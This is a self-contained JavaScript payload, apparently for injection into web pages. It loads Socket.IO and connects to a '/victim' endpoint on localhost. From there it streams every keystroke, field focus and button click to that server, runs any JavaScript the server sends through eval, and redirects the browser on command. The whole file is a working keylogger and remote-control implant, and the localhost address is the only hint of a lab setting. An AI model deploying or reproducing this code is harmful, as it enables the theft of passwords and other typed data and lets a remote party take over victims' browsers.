(function () {

    function socketIOLibInjection() {
        // Import the Socket.IO script when script src is loaded
        var head = document.getElementsByTagName('head')[0];
        var script = document.createElement('script');
        // Use CDN of socket.io 
        script.src = "https://cdn.socket.io/4.5.0/socket.io.min.js";

        // Import the Socket.IO script when script src is loaded
        script.onreadystatechange = init;
        script.onload = init;

        // Add script tag in top of HEAD
        head.prepend(script);
    }

    function elName(element) {
        return element.id ? `#${element.id}` : (element.className ? `.${element.className}` : `[${element.type}]`)
    }

    function spyOnKeyDown(socket) {
        document.onkeydown = function (e) {
            e = e || window.event;
            socket.emit('type', e.key);
        };
    }

    function spyOnFieldFocus(socket) {
        const inputFields = document.querySelectorAll('input,textarea');

        const emitFocus = function () {
            socket.emit('focus', elName(this));
        };

        inputFields.forEach((field) => field.onfocus = emitFocus);
    }

    function spyOnClick(socket) {
        const buttons = document.querySelectorAll('button');
        const emitClick = function () {
            socket.emit('click', elName(this));
        };

        buttons.forEach((btn) => btn.onclick = emitClick);
    }


    function listenToRemoteJs(socket) {
        socket.on('eval', function (js) {
            console.log(js)
            eval(js);
        });
    }

    function listenToRedirect(socket) {
        socket.on('redirect', function (url) {
            console.log(url)
            window.location = url;
        });
    }


    function init() {
        var socket = io('http://localhost:3000/victim');

        spyOnClick(socket);
        spyOnKeyDown(socket);
        spyOnFieldFocus(socket);
        listenToRemoteJs(socket);
        listenToRedirect(socket);
    }

    socketIOLibInjection();

}());